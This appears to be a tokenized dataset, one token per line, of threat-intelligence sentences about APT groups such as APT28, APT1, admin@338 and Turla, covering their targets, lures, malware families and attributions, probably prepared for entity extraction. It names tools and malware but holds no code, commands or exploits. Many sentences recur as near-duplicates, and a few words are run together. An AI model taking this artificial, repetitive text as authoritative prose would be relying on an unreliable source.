a
group
that
carries
out
Chinese
state-sponsored
espionage
activity
in
addition
to
financially
motivated
activity
.
 
APT41
has
been
active
since
as
early
as
2012
.
 
The
group
has
been
observed
targeting
healthcare
,
telecom
,
technology
,
and
video
game
industries
in
14
countries
.
 
Axiom
:
Group72
.
 
Axiom
is
a
cyber
espionage
group
suspected
to
be
associated
with
the
Chinese
government
.
 
It
is
responsible
for
the
Operation
SMN
campaign
.
 
Though
both
this
group
and
O
Winnti
Groupuse
the
malware
O
Winnti
,
the
two
groups
appear
to
be
distinct
based
on
differences
in
reporting
on
the
groups'
TTPs
and
targeting
.
 
Suckfly
is
a
China
based
threat
group
that
has
been
active
since
at
least
2014
.
 
TA459
is
a
threat
group
believed
to
operate
out
of
China
that
has
targeted
countries
including
Russia
,
Belarus
,
Mongolia
,
and
others
.
 
TA505
is
a
financially
motivated
threat
group
that
has
been
active
since
at
least
2014
.
 
The
group
is
known
for
frequently
changing
malware
and
driving
global
trends
in
criminal
malware
distribution
.
 
Magic
Hound
:
Rocket
Kitten
,
Operation
Saffron
Rose
,
Ajax
Security
Team
,
Operation
Woolen-Goldfish
,
Newscaster
,
Cobalt
Gypsy
,
APT35
.
 
Magic
Hound
is
an
Iranian-sponsored
threat
group
operating
primarily
in
the
Middle
East
that
dates
back
as
early
as
2014
.
 
The
group
behind
the
campaign
has
primarily
targeted
organizations
in
the
energy
,
government
,
and
technology
sectors
that
are
either
based
or
have
business
interests
in
Saudi
Arabia
.
 
menuPass
:
Stone
Panda
,
APT10
,
Red
Apollo
,
CVNX
,
HOGFISH
.
 
menuPass
is
a
threat
group
that
appears
to
originate
from
China
and
has
been
active
since
approximately
2009
.
 
The
group
has
targeted
healthcare
,
defense
,
aerospace
,
and
government
sectors
,
and
has
targeted
Japanese
victims
since
at
least
2014
.
 
In
2016
and
2017
,
the
group
targeted
managed
IT
service
providers
,
manufacturing
and
mining
companies
,
and
a
university
.
 
Moafee
is
a
threat
group
that
appears
to
operate
from
the
Guandong
Province
of
China
.
 
Due
to
overlapping
TTPs
,
including
similar
custom
tools
,
Moafee
is
thought
to
have
a
direct
or
indirect
relationship
with
the
threat
group
O
DragonOK
.
 
SilverTerrier
is
a
Nigerian
threat
group
that
has
been
seen
active
since
2014
.
 
SilverTerrier
mainly
targets
organizations
in
high
technology
,
higher
education
,
and
manufacturing
.
 
Operation
Soft
Cell
is
a
group
that
is
reportedly
affiliated
with
China
and
is
likely
state-sponsored
.
 
The
group
has
operated
since
at
least
2012
and
has
compromised
high-profile
telecommunications
networks
.
 
Sowbug
is
a
threat
group
that
has
conducted
targeted
attacks
against
organizations
in
South
America
and
Southeast
Asia
,
particularly
government
entities
,
since
at
least
2015
.
 
Tropic
Trooper
is
an
unaffiliated
threat
group
that
has
led
targeted
campaigns
against
targets
in
Taiwan
,
the
Philippines
,
and
Hong
Kong
.
 
Tropic
Trooper
focuses
on
targeting
government
,
healthcare
,
transportation
,
and
high-tech
industries
and
has
been
active
since
2011
.
 
Turla
:
Waterbug
,
WhiteBear
,
VENOMOUS
BEAR
,
Snake
,
Krypton
.
 
Turla
is
a
Russian-based
threat
group
that
has
infected
victims
in
over
45
countries
,
spanning
a
range
of
industries
including
government
,
embassies
,
military
,
education
,
research
and
pharmaceutical
companies
since
2004
.
 
Heightened
activity
was
seen
in
mid-2015
.
 
Turla
is
known
for
conducting
watering
hole
and
spearphishing
campaigns
and
leveraging
in-house
tools
and
malware
.
 
Turla
s
espionage
platform
is
mainly
used
against
Windows
machines
,
but
has
also
been
seen
used
against
macOS
and
Linux
machines
.
 
Winnti
Group
:
Blackfly
.
 
Winnti
Group
is
a
threat
group
with
Chinese
origins
that
has
been
active
since
at
least
2010
.
 
The
group
has
heavily
targeted
the
gaming
industry
,
but
it
has
also
expanded
the
scope
of
its
targeting
.
 
Some
reporting
suggests
a
number
of
other
groups
,
including
Axiom
,
APT17
,
and
Ke3chang
,
are
closely
linked
to
Winnti
Group
.
 
Stealth
Falcon
is
a
threat
group
that
has
conducted
targeted
spyware
attacks
against
Emirati
journalists
,
activists
,
and
dissidents
since
at
least
2012
.
 
Circumstantial
evidence
suggests
there
could
be
a
link
between
this
group
and
the
United
Arab
Emirates
(
UAE
)
government
,
but
that
has
not
been
confirmed
.
 
Stolen
Pencil
is
a
threat
group
likely
originating
from
DPRK
that
has
been
active
since
at
least
May
2018
.
 
The
group
appears
to
have
targeted
academic
institutions
,
but
its
motives
remain
unclear
.
 
Strider
:
ProjectSauron
.
 
Strider
is
a
threat
group
that
has
been
active
since
at
least
2011
and
has
targeted
victims
in
Russia
,
China
,
Sweden
,
Belgium
,
Iran
,
and
Rwanda
.
 
Putter
Panda
:
APT2
,
MSUpdater
.
 
Putter
Panda
is
a
Chinese
threat
group
that
has
been
attributed
to
Unit
61486
of
the
12th
Bureau
of
the
PLA
s
3rd
General
Staff
Department
(
GSD
)
.
 
Rancor
is
a
threat
group
that
has
led
targeted
campaigns
against
the
South
East
Asia
region
.
 
Rancor
uses
politically-motivated
lures
to
entice
victims
to
open
malicious
documents
.
 
RTM
is
a
cybercriminal
group
that
has
been
active
since
at
least
2015
and
is
primarily
interested
in
users
of
remote
banking
systems
in
Russia
and
neighboring
countries
.
 
The
group
uses
a
Trojan
by
the
same
name
(
RTM
)
.
 
FIN4
is
a
financially
motivated
threat
group
that
has
targeted
confidential
information
related
to
the
public
financial
market
,
particularly
regarding
healthcare
and
pharmaceutical
companies
,
since
at
least
2013
.
 
FIN4
is
unique
in
that
they
do
not
infect
victims
with
typical
persistent
malware
,
but
rather
they
focus
on
capturing
credentials
authorized
to
access
email
and
other
non-public
correspondence
.
 
FIN5
is
a
financially
motivated
threat
group
that
has
targeted
personally
identifiable
information
and
payment
card
information
.
 
The
group
has
been
active
since
at
least
2008
and
has
targeted
the
restaurant
,
gaming
,
and
hotel
industries
.
 
The
group
is
made
up
of
actors
who
likely
speak
Russian
.
 
FIN6
:
ITG08
.
 
FIN6
is
a
cyber
crime
group
that
has
stolen
payment
card
data
and
sold
it
for
profit
on
underground
marketplaces
.
 
This
group
has
aggressively
targeted
and
compromised
point
of
sale
(
PoS
)
systems
in
the
hospitality
and
retail
sectors
.
 
Leviathan
:
TEMP.Jumper
,
APT40
,
TEMP.Periscope
.
 
Leviathan
is
a
cyber
espionage
group
that
has
been
active
since
at
least
2013
.
 
The
group
generally
targets
defense
and
government
organizations
,
but
has
also
targeted
a
range
of
industries
including
engineering
firms
,
shipping
and
transportation
,
manufacturing
,
defense
,
government
offices
,
and
research
universities
in
the
United
States
,
Western
Europe
,
and
along
the
South
China
Sea
.
 
Lotus
Blossom
:
DRAGONFISH
,
Spring
Dragon
.
 
Lotus
Blossom
is
a
threat
group
that
has
targeted
government
and
military
organizations
in
Southeast
Asia
.
 
Machete
:
El
Machete
.
 
Machete
is
a
group
that
has
been
active
since
at
least
2010
,
targeting
high-profile
government
entities
in
Latin
American
countries
.
 
admin@338
is
a
China
based
cyber
threat
group
.
 
It
has
previously
used
newsworthy
events
as
lures
to
deliver
malware
and
has
primarily
targeted
organizations
involved
in
financial
,
economic
,
and
trade
policy
,
typically
using
publicly
available
RATs
such
as
PoisonIvy
,
as
well
as
some
non-public
backdoors
.
 
APT1
:
Comment
Crew
,
Comment
Group
,
Comment
Panda
.
 
APT1
is
a
Chinese
threat
group
that
has
been
attributed
to
the
2nd
Bureau
of
the
People
s
Liberation
Army
(
PLA
)
General
Staff
Department
s
(
GSD
)
3rd
Department
,
commonly
known
by
its
Military
Unit
Cover
Designator
(
MUCD
)
as
Unit
61398
.
 
APT12
:
IXESHE
,
DynCalc
,
Numbered
Panda
,
DNSCALC
.
 
APT12
is
a
threat
group
that
has
been
attributed
to
China
.
 
The
group
has
targeted
a
variety
of
victims
including
but
not
limited
to
media
outlets
,
high-tech
companies
,
and
multiple
governments
.
 
The
admin@338
has
largely
targeted
organizations
involved
in
financial
,
economic
and
trade
policy
,
typically
using
publicly
available
RATs
such
as
Poison
Ivy
,
as
well
some
non-public
backdoors
.
 
The
admin@338
started
targeting
Hong
Kong
media
companies
,
probably
in
response
to
political
and
economic
challenges
in
Hong
Kong
and
China
.
 
Multiple
China-based
cyber
threat
groups
have
targeted
international
media
organizations
in
the
past
.
 
The
admin@338
has
targeted
international
media
organizations
in
the
past
.
 
In
August
2015
,
the
admin@338
sent
spear
phishing
emails
to
a
number
of
Hong
Kong-based
media
organizations
,
including
newspapers
,
radio
,
and
television
.
 
In
August
2015
,
the
threat
actors
sent
spear
phishing
emails
to
a
number
of
Hong
Kong-based
media
organizations
,
including
newspapers
,
radio
,
and
television
.
 
In
August
2015
,
the
admin@338
sent
spear
phishing
emails
to
a
number
of
Hong
Kong-based
media
organizations
.
 
The
admin@338
previous
activities
against
financial
and
policy
organizations
have
largely
focused
on
spear
phishing
emails
written
in
English
,
destined
for
Western
audiences
.
 
Once
the
LOWBALL
malware
calls
back
to
the
Dropbox
account
,
the
admin@338
will
create
a
file
called
upload.bat
which
contains
commands
to
be
executed
on
the
compromised
computer
.
 
We
observed
the
admin@338
upload
a
second
stage
malware
,
known
as
BUBBLEWRAP
(
also
known
as
Backdoor.APT.FakeWinHTTPHelper
)
to
their
Dropbox
account
along
with
the
following
command
.
 
We
have
previously
observed
the
admin@338
group
use
BUBBLEWRAP
.
 
The
LOWBALL
first
stage
malware
allows
the
group
to
collect
information
from
victims
and
then
deliver
the
BUBBLEWRAP
second
stage
malware
to
their
victims
after
verifying
that
they
are
indeed
interesting
targets
.
 
The
admin@338
linked
to
China
and
alleged
to
be
responsible
for
targeted
attacks
against
foreign
governments
and
ministries
,
has
now
pointed
its
focus
inward
at
China
autonomous
territory
Hong
Kong
.
 
An
APT
gang
linked
to
China
and
alleged
to
be
responsible
for
targeted
attacks
against
foreign
governments
and
ministries
,
has
now
pointed
its
focus
inward
at
China
autonomous
territory
Hong
Kong
.
 
The
group
targeting
Hong
Kong
media
outlets
is
called
admin@338
and
is
known
to
researchers
for
using
publicly
available
remote
access
Trojans
such
as
Poison
Ivy
to
attack
government
and
financial
firms
specializing
in
global
economic
policy
.
 
The
agroup
targeting
Hong
Kong
media
outlets
is
called
admin@338
and
is
known
to
researchers
for
using
publicly
available
remote
access
Trojans
such
as
Poison
Ivy
to
attack
government
and
financial
firms
specializing
in
global
economic
policy
.
 
The
admin@338
,
active
since
2008
,
has
been
seen
targeting
organizations
in
the
financial
services
,
telecoms
,
government
,
and
defense
sectors
.
 
The
APT
actor
,
active
since
2008
,
has
been
seen
targeting
organizations
in
the
financial
services
,
telecoms
,
government
,
and
defense
sectors
.
 
In
August
2013
,
FireEye
reported
that
admin@338
had
been
using
the
Poison
Ivy
RAT
in
its
operations
.
 
In
March
2014
,
the
admin@338
leveraged
the
disappearance
of
Malaysia
Airlines
Flight
MH370
to
target
a
government
in
the
Asia-Pacific
region
and
a
US-based
think
tank
.
 
In
March
2014
,
the
group
leveraged
the
disappearance
of
Malaysia
Airlines
Flight
MH370
to
target
a
government
in
the
Asia-Pacific
region
and
a
US-based
think
tank
.
 
According
to
FireEye
,
the
admin@338
sent
out
emails
containing
malicious
documents
designed
to
exploit
Microsoft
Office
vulnerabilities
in
an
effort
to
deliver
a
piece
of
malware
dubbed
LOWBALL
.
 
According
to
FireEye
,
the
attackers
sent
out
emails
containing
malicious
documents
designed
to
exploit
Microsoft
Office
vulnerabilities
in
an
effort
to
deliver
a
piece
of
malware
dubbed
LOWBALL
.
 
The
admin@338
's
Dropbox
accounts
have
also
been
found
to
contain
a
different
backdoor
dubbed
BUBBLEWRAP
.
 
Researchers
have
pointed
out
that
it
is
not
uncommon
for
China-based
threat
groups
to
target
Hong
Kong
media
organizations
,
particularly
ones
whose
reporting
focuses
on
the
pro-democracy
movement
.
 
Researchers
have
pointed
out
that
it
is
not
uncommon
for
admin@338
to
target
Hong
Kong
media
organizations
,
particularly
ones
whose
reporting
focuses
on
the
pro-democracy
movement
.
 
This
week
the
experts
at
FireEye
discovered
that
a
group
of
Chinese-based
hackers
called
admin@338
had
sent
multiple
MH370-themed
spear
phishing
emails
,
the
attackers
targeted
government
officials
in
Asia-Pacific
,
it
is
likely
for
cyber
espionage
purpose
.
 
The
attackers
used
the
popular
Poison
Ivy
RAT
and
WinHTTPHelper
malware
to
compromise
the
computers
of
government
officials
.
 
The
admin@338
used
the
popular
Poison
Ivy
RAT
and
WinHTTPHelper
malware
to
compromise
the
computers
of
government
officials
.
 
FireEye
analysts
documented
the
admin@338
group
's
activities
in
a
previous
paper
titled
Poison
Ivy
:
Assessing
Damage
and
Extracting
Intelligence
paper
.
 
The
spear-phishing
campaign
against
Asian
entities
isn't
isolated
,
the
admin@338
also
started
another
attack
against
the
US-based
think
tank
on
14th
March
.
 
Our
analysis
has
led
us
to
conclude
that
APT1
is
likely
government-sponsored
and
one
of
the
most
persistent
of
China
's
cyber
threat
actors
.
 
FireEye
said
it
has
tracked
admin@338
's
activity
since
2013
and
the
group
has
largely
targeted
organizations
involved
in
financial
,
economic
,
and
trade
policy
.
 
The
simplest
conclusion
based
on
these
facts
is
that
APT1
is
operating
in
China
,
and
most
likely
in
Shanghai
.
 
These
data
sets
show
that
APT1
is
either
operating
in
China
during
normal
Chinese
business
hours
or
that
APT1
is
intentionally
going
to
painstaking
lengths
to
look
like
they
are
.
 
APT1
has
used
and
steadily
modified
BISCUIT
since
as
early
as
2007
and
continues
to
use
it
presently
.
 
While
APT1
intruders
occasionally
use
publicly
available
backdoors
such
as
Poison
Ivy
and
Gh0st
RAT
.
 
Given
the
mission
,
resourcing
,
and
location
of
PLA
Unit
61398
,
we
conclude
that
PLA
Unit
61398
is
APT1
.
 
APT1
were
a
highly
prolific
cyber-attack
group
operating
out
of
China
.
 
APT1
is
a
China-based
cyber-espionage
group
,
active
since
mid-2006
.
 
APT12
's
targets
are
consistent
with
larger
People
's
Republic
of
China
(
PRC
)
goals
.
 
Since
the
release
of
the
Arbor
blog
post
,
FireEye
has
observed
APT12
use
a
modified
backdoor
that
we
call
HIGHTIDE
.
 
However
,
the
malware
shared
several
traits
with
the
RIPTIDE
and
HIGHTIDE
backdoor
that
we
have
attributed
to
APT12
.
 
From
October
2012
to
May
2014
,
FireEye
observed
APT12
utilizing
RIPTIDE
,
that
communicates
via
HTTP
to
a
hard-coded
command
and
control
(
C2
)
server
.
 
Similar
to
RIPTIDE
campaigns
,
APT12
infects
target
systems
with
HIGHTIDE
using
a
Microsoft
Word
(
.doc
)
document
that
exploits
CVE-2012-0158
.
 
FireEye
believes
the
change
from
RIPTIDE
to
HIGHTIDE
represents
a
temporary
tool
shift
to
decrease
malware
detection
while
APT12
developed
a
completely
new
malware
toolset
.
 
They
have
largely
targeted
organizations
involved
in
financial
,
economic
and
trade
policy
,
typically
using
publicly
available
RATs
such
as
Poison
Ivy
,
as
well
some
non-public
backdoors
.
 
A
China-based
cyber
threat
group
,
which
FireEye
tracks
as
an
uncategorized
advanced
persistent
threat
(
APT
)
group
and
other
researchers
refer
to
as
admin@338
,
may
have
conducted
the
activity
.
 
The
group
previous
activities
against
financial
and
policy
organizations
have
largely
focused
on
spear
phishing
emails
written
in
English
,
destined
for
Western
audiences
.
 
About
four
months
after
The
New
York
Times
publicized
an
attack
on
its
network
,
the
APT12
behind
the
intrusion
deployed
updated
versions
of
their
Backdoor.APT.Aumlib
and
Backdoor.APT.Ixeshe
malware
families
.
 
With
this
in
mind
,
this
week
we
are
providing
some
indicators
for
a
China
based
adversary
who
we
crypt
as
"
NUMBERED
PANDA
"
Numbered
Panda
has
a
long
list
of
high-profile
victims
and
is
known
by
a
number
of
names
including
:
DYNCALC
,
IXESHE
,
JOY
RAT
,
APT-12
,
etc
.
 
Numbered
Panda
has
a
long
list
of
high-profile
victims
and
is
known
by
a
number
of
names
including
:
DYNCALC
,
IXESHE
,
JOY
RAT
,
APT-12
,
etc
.
 
The
new
campaigns
mark
the
first
significant
stirrings
from
the
APT12
since
it
went
silent
in
January
in
the
wake
of
a
detailed
expose
of
the
group
and
its
exploits
and
a
retooling
of
what
security
researchers
believe
is
a
massive
spying
operation
based
in
China
.
 
Between
November
26
,
2015
,
and
December
1
,
2015
,
known
and
suspected
China-based
APT16
launched
several
spear
phishing
attacks
targeting
Japan
and
Taiwan
in
the
high-tech
,
government
services
,
media
and
financial
services
industries
.
 
Between
November
26
,
2015
,
and
December
1
,
2015
,
known
and
suspected
China-based
APT
groups
launched
several
spear
phishing
attacks
targeting
Japanese
and
Taiwanese
organizations
in
the
high-tech
,
government
services
,
media
and
financial
services
industries
.
 
On
November
26
,
2015
,
a
suspected
China-based
APT16
sent
Japanese
defense
policy-themed
spear
phishing
emails
to
multiple
Japanese
financial
and
high-tech
companies
.
 
On
November
26
,
2015
,
a
suspected
China-based
APT
group
sent
Japanese
defense
policy-themed
spear
phishing
emails
to
multiple
Japanese
financial
and
high-tech
companies
.
 
While
attribution
of
the
first
two
spear
phishing
attacks
is
still
uncertain
,
we
attribute
the
second
December
phishing
campaign
to
the
China-based
APT
group
that
we
refer
to
as
APT16
.
 
APT16
actors
sent
spear
phishing
emails
to
two
Taiwanese
media
organizations
.
 
On
the
same
date
that
APT16
targeted
Taiwanese
media
,
suspected
Chinese
APT
actors
also
targeted
a
Taiwanese
government
agency
,
sending
a
lure
document
that
contained
instructions
for
registration
and
subsequent
listing
of
goods
on
a
local
Taiwanese
auction
website
.
 
It
is
possible
,
although
not
confirmed
,
that
APT16
was
also
responsible
for
targeting
this
government
agency
,
given
both
the
timeframe
and
the
use
of
the
same
n-day
to
eventually
deploy
the
ELMER
backdoor
.
 
Despite
the
differing
sponsorship
,
penetration
of
Hong
Kong
and
Taiwan-based
media
organizations
continues
to
be
a
priority
for
China-based
APT16
.
 
The
suspected
APT16
targeting
of
the
Taiwanese
government
agency
in
addition
to
the
Taiwanese
media
organizations
further
supports
this
possibility
.
 
APT17
was
embedding
the
encoded
CnC
IP
address
for
the
BLACKCOFFEE
malware
in
legitimate
Microsoft
TechNet
profiles
pages
and
forum
threads
,
a
method
some
in
the
information
security
community
call
a
"
dead
drop
resolver
"
.
 
APT17
,
also
known
as
DeputyDog
,
is
a
China-based
threat
group
that
FireEye
Intelligence
has
observed
conducting
network
intrusions
against
U.S.
government
entities
,
the
defense
industry
,
law
firms
,
information
technology
companies
,
mining
companies
,
and
non-government
organizations
.
 
FireEye
has
monitored
APT17
's
use
of
BLACKCOFFEE
variants
since
2013
to
masquerade
malicious
communication
as
normal
web
traffic
by
disguising
the
CnC
communication
as
queries
to
web
search
engines
.
 
The
use
of
BLACKCOFFEE
demonstrates
APT17
's
evolving
use
of
public
websites
to
hide
in
plain
sight
.
 
TG-0416
is
a
stealthy
and
extremely
successful
Advanced
Persistent
Threat
(
APT
)
group
known
to
target
a
broad
range
of
verticals
since
at
least
2009
,
including
technology
,
industrial
,
manufacturing
,
human
rights
groups
,
government
,
pharmaceutical
,
and
medical
technology
.
 
The
APT18
then
installed
the
hcdLoader
RAT
,
which
installs
as
a
Windows
service
and
provides
command
line
access
to
the
compromised
system
.
 
The
malware
used
by
the
Wekby
group
has
ties
to
the
HTTPBrowser
malware
family
,
and
uses
DNS
requests
as
a
command
and
control
mechanism
.
 
These
URIs
result
in
the
download
of
an
installer
,
which
creates
a
PE
of
the
malware
typically
known
as
HTTPBrowser
,
but
called
Token
Control
by
the
Wekby
group
themselves
(
based
upon
the
PDB
strings
found
within
many
of
the
samples
)
.
 
APT19
seemed
to
be
going
after
defense
sector
firms
,
Chinese
dissident
groups
and
political
,
financial
,
pharmaceutical
and
energy
sectors
that
could
benefit
the
Chinese
economy
.
 
APT19
seemed
to
be
going
after
defense
sector
firms
,
Chinese
dissident
groups
and
other
political
target
,
as
well
as
certain
financial
targets
and
other
commercial
targets
in
pharmaceutical
and
energy
sectors
that
could
benefit
the
Chinese
economy
.
 
FANCY
BEAR
(
also
known
as
Sofacy
or
APT28
)
is
a
separate
Russian-based
threat
actor
,
which
has
been
active
since
mid
2000s
,
and
has
been
responsible
for
targeted
intrusion
campaigns
against
the
Aerospace
,
Defense
,
Energy
,
Government
and
Media
sectors
.
 
APT28
malware
,
in
particular
the
family
of
modular
backdoors
that
we
call
CHOPSTICK
,
indicates
a
formal
code
development
environment
.
 
However
,
three
themes
in
APT28
's
targeting
clearly
reflects
LOCs
of
specific
interest
to
an
Eastern
European
government
,
most
likely
the
Russian
government
.
 
We
identified
three
themes
in
APT28
's
lures
and
registered
domains
,
which
together
are
particularly
relevant
to
the
Russian
government
.
 
Georgian
military
security
issues
,
particularly
with
regard
to
U.S.
cooperation
and
NATO
,
provide
a
strong
incentive
for
Russian
state-sponsored
threat
actors
to
steal
information
that
sheds
light
on
these
topics
.
 
Instead
,
we
observed
the
two
Russian
espionage
groups
compromise
the
same
systems
and
engage
separately
in
the
theft
of
identical
credentials
.
 
APT28
's
malware
settings
suggest
that
the
developers
have
done
the
majority
of
their
work
in
a
Russian
language
build
environment
during
Russian
business
hours
,
which
suggests
that
the
Russian
government
is
APT28
's
sponsor
.
 
We
believe
that
APT28
's
targeting
of
the
MOD
aligns
with
Russian
threat
perceptions
.
 
We
assess
that
APT28
is
most
likely
sponsored
by
the
Russian
government
.
 
Given
the
available
data
,
we
assess
that
APT28
's
work
is
sponsored
by
the
Russian
government
.
 
The
targets
were
similar
to
a
2015
TG-4127
campaign
individuals
in
Russia
and
the
former
Soviet
states
,
current
and
former
military
and
government
personnel
in
the
U.S.
and
Europe
,
individuals
working
in
the
defense
and
government
supply
chain
,
and
authors
and
journalists
but
also
included
email
accounts
linked
to
the
November
2016
United
States
presidential
election
.
 
The
targets
of
TG-4127
include
military
,
government
and
defense
sectors
.
 
Some
of
APT28
's
more
commonly
used
tools
are
the
SOURFACE
downloader
,
its
second
stage
backdoor
EVILTOSS
,
and
a
modular
family
of
implants
that
we
call
CHOPSTICK
.
 
While
TG-4127
continues
to
primarily
threaten
organizations
and
individuals
operating
in
Russia
and
former
Soviet
states
,
this
campaign
illustrates
its
willingness
to
expand
its
scope
to
other
targets
that
have
intelligence
of
interest
to
the
Russian
government
.
 
CTU
researchers
assess
with
moderate
confidence
that
the
group
is
operating
from
the
Russian
Federation
and
is
gathering
intelligence
on
behalf
of
the
Russian
government
.
 
This
intelligence
has
been
critical
to
protecting
and
informing
our
clients
,
exposing
this
threat
,
and
strengthening
our
confidence
in
attributing
APT28
to
the
Russian
government
.
 
Our
visibility
into
the
operations
of
APT28
-
a
group
we
believe
the
Russian
government
sponsors
-
has
given
us
insight
into
some
of
the
government
's
targets
,
as
well
as
its
objectives
and
the
activities
designed
to
further
them
.
 
Since
at
least
2007
,
APT28
has
engaged
in
extensive
operations
in
support
of
Russian
strategic
interests
.
 
APT28
espionage
activity
has
primarily
targeted
entities
in
the
U.S.
,
Europe
,
and
the
countries
of
the
former
Soviet
Union
,
including
governments
,
militaries
,
defense
attaches
,
media
entities
,
and
dissidents
and
figures
opposed
to
the
current
Russian
government
.
 
APT28
espionage
activity
has
primarily
targeted
entities
in
the
U.S.
,
Europe
,
and
the
countries
of
the
former
Soviet
Union
,
including
governments
and
militaries
,
defense
attaches
,
media
entities
,
and
dissidents
and
figures
opposed
to
the
current
Russian
government
.
 
Over
the
past
two
years
,
Russia
appears
to
have
increasingly
leveraged
APT28
to
conduct
information
operations
commensurate
with
broader
strategic
military
doctrine
.
 
After
compromising
a
victim
organization
,
APT28
will
steal
internal
data
that
is
then
leaked
to
further
political
narratives
aligned
with
Russian
interests
.
 
After
compromising
a
political
organization
,
APT28
will
steal
internal
data
.
 
On
December
29
,
2016
,
the
Department
of
Homeland
Security
(
DHS
)
and
Federal
Bureau
of
Investigation
(
FBI
)
released
a
Joint
Analysis
Report
confirming
FireEye
's
long
held
public
assessment
that
the
Russian
government
sponsors
APT28
.
 
In
October
2014
,
FireEye
released
APT28
:
A
Window
into
Russia
's
Cyber
Espionage
Operations
,
and
characterized
APT28
's
activity
as
aligning
with
the
Russian
government
's
strategic
intelligence
requirements
.
 
In
October
2014
,
FireEye
released
APT28
:
A
Window
into
Russia
's
Cyber
Espionage
Operations'
,
and
characterized
APT28
's
activity
as
aligning
with
the
Russian
government
's
strategic
intelligence
requirements
.
 
APT28
targets
Russian
rockers
and
dissidents
Pussy
Riot
via
spear-phishing
emails
.
 
Our
investigation
of
APT28
's
compromise
of
WADA
's
network
,
and
our
observations
of
the
surrounding
events
reveal
how
Russia
sought
to
counteract
a
damaging
narrative
and
delegitimize
the
institutions
leveling
criticism
.
 
Since
releasing
our
2014
report
,
we
continue
to
assess
that
APT28
is
sponsored
by
the
Russian
government
.
 
In
our
2014
report
,
we
identified
APT28
as
a
suspected
Russian
government-sponsored
espionage
actor
.
 
For
full
details
,
please
reference
our
2014
report
,
APT28
:
A
Window
into
Russia
's
Cyber
Espionage
Operations
.
 
The
espionage
group
,
which
according
to
the
U.S.
Department
of
Homeland
Security
(
DHS
)
and
the
Federal
Bureau
of
Investigation
(
FBI
)
is
linked
to
the
Russian
government
,
returned
to
low-key
intelligence-gathering
operations
during
2017
and
into
2018
,
targeting
a
range
of
military
and
government
targets
in
Europe
and
South
America
.
 
The
APT28
,
which
is
linked
to
the
Russian
government
,
returned
to
low-key
intelligence-gathering
operations
during
2017
and
into
2018
,
targeting
a
range
of
military
and
government
targets
in
Europe
and
South
America
.
 
Another
attack
group
,
Earworm
(
aka
Zebrocy
)
,
has
been
active
since
at
least
May
2016
and
is
involved
in
what
appears
to
be
intelligence
gathering
operations
against
military
targets
in
Europe
,
Central
Asia
,
and
Eastern
Asia
.
 
Several
sources
consider
APT28
a
group
of
CyberMercs
based
in
Russia
.
 
The
primary
targets
of
APT28
are
potential
victims
in
several
countries
such
as
Ukraine
,
Spain
,
Russia
,
Romania
,
the
United
States
and
Canada
.
 
We
have
reasons
to
believe
that
the
operators
of
the
APT28
network
are
either
Russian
citizens
or
citizens
of
a
neighboring
country
that
speak
Russian
.
 
Previous
work
published
by
security
vendor
FireEye
in
October
2014
suggests
the
group
might
be
of
Russian
origin
.
 
Finally
,
the
use
of
recent
domestic
events
and
a
prominent
US
military
exercise
focused
on
deterring
Russian
aggression
highlight
APT28
's
ability
and
interest
in
exploiting
geopolitical
events
for
their
operations
.
 
In
2013
,
the
Sofacy
group
expanded
their
arsenal
and
added
more
backdoors
and
tools
,
including
CORESHELL
,
SPLM
,
JHUHUGIT
,
AZZY
and
a
few
others
.
 
In
2013
,
the
Sofacy
group
expanded
their
arsenal
and
added
more
backdoors
and
tools
,
including
CORESHELL
,
SPLM
(
aka
Xagent
,
aka
CHOPSTICK
)
,
JHUHUGIT
(
which
is
built
with
code
from
the
Carberp
sources
)
,
AZZY
(
aka
ADVSTORESHELL
,
NETUI
,
EVILTOSS
,
and
spans
across
4-5
generations
)
and
a
few
others
.
 
The
Sofacy
group
spearphished
targets
in
several
waves
with
Flash
exploits
leading
to
their
Carberp
based
JHUHUGIT
downloaders
and
further
stages
of
malware
.
 
APT28
spearphished
targets
in
several
waves
with
Flash
exploits
leading
to
their
Carberp
based
JHUHUGIT
downloaders
and
further
stages
of
malware
.
 
The
group
spearphished
targets
in
several
waves
with
Flash
exploits
leading
to
their
Carberp
based
JHUHUGIT
downloaders
and
further
stages
of
malware
.
 
Their
evolving
and
modified
SPLM
,
CHOPSTICK
,
XAgent
code
is
a
long-standing
part
of
Sofacy
activity
,
however
much
of
it
is
changing
.
 
FireEye
has
moderate
confidence
that
a
campaign
targeting
the
hospitality
sector
is
attributed
to
Russian
actor
APT28
.
 
APT28
is
using
novel
techniques
involving
the
EternalBlue
exploits
and
the
open
source
tool
Responder
to
spread
laterally
through
networks
and
likely
target
travelers
.
 
Upon
gaining
access
to
the
machines
connected
to
corporate
and
guest
Wi-Fi
networks
,
APT28
deployed
Responder
.
 
Compared
to
other
backdoor
tools
associated
with
the
Sofacy
group
,
the
use
of
Zebrocy
in
attack
campaigns
is
far
more
widespread
.
 
As
alluded
to
in
our
previous
blog
regarding
the
Cannon
tool
,
the
Sofacy
group
(
AKA
Fancy
Bear
,
APT28
,
STRONTIUM
,
Pawn
Storm
,
Sednit
)
has
persistently
attacked
various
government
and
private
organizations
around
the
world
from
mid-October
2018
through
mid-November
2018
.
 
Russian
citizensjournalists
,
software
developers
,
politicians
,
researchers
at
universities
,
and
artists
are
also
targeted
by
Pawn
Storm
.
 
The
JHUHUGIT
implant
became
a
relatively
popular
first
stage
for
the
Sofacy
attacks
and
was
used
again
with
a
Java
zero-day
(
CVE-2015-2590
)
in
July
2015
.
 
While
the
JHUHUGIT
(
and
more
recently
,
"
JKEYSKW
"
)
implant
used
in
most
of
the
Sofacy
attacks
,
high
profile
victims
are
being
targeted
with
another
first
level
implant
,
representing
the
latest
evolution
of
their
AZZY
Trojan
.
 
Once
a
foothold
is
established
,
Sofacy
trys
to
upload
more
backdoors
,
USB
stealers
as
well
as
other
hacking
tools
such
as
"
Mimikatz
"
for
lateral
movement
.
 
Once
a
foothold
is
established
,
they
try
to
upload
more
backdoors
,
USB
stealers
as
well
as
other
hacking
tools
such
as
"
Mimikatz
"
for
lateral
movement
.
 
The
Sofacy
threat
group
continues
to
target
government
organizations
in
the
EU
,
US
,
and
former
Soviet
states
to
deliver
the
Zebrocy
tool
as
a
payload
.
 
Of
note
,
we
also
discovered
the
Sofacy
group
using
a
very
similar
delivery
document
to
deliver
a
new
Trojan
called
Cannon
.
 
Komplex
shares
a
significant
amount
of
functionality
and
traits
with
another
tool
used
by
Sofacy
the
Carberp
variant
that
Sofacy
had
used
in
previous
attack
campaigns
on
systems
running
Windows
.
 
The
Sofacy
group
created
the
Komplex
Trojan
to
use
in
attack
campaigns
targeting
the
OS
X
operating
system
a
move
that
showcases
their
continued
evolution
toward
multi-platform
attacks
.
